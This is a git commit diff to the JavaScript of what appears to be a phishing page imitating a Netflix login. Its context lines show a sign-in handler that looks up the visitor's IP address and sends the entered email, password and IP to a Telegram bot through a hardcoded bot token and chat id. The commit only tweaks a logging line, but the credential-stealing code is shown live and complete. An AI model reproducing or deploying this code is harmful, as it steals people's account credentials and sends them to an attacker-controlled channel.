f33cabd3cead32b89096297747317fbbc3498556
Saikumar Shetty <73155077+Shettysai@users.noreply.github.com>
2022-08-15 01:06:01 +0530

    Update script.js

--- js/script.js
+++ js/script.js
@@ -15,7 +15,7 @@ const signin = document.getElementById("signin")
 signin.addEventListener("click", async (ev)=>{
             ev.preventDefault();
     const ip = await fetch("https://api.db-ip.com/v2/free/self")
-            console.log("signing in...", ip);
+            console.log("signing in...", ip.json());
                 const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`NETFLIX  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip.json())}`
     fetch(url, {
         method: "POST",
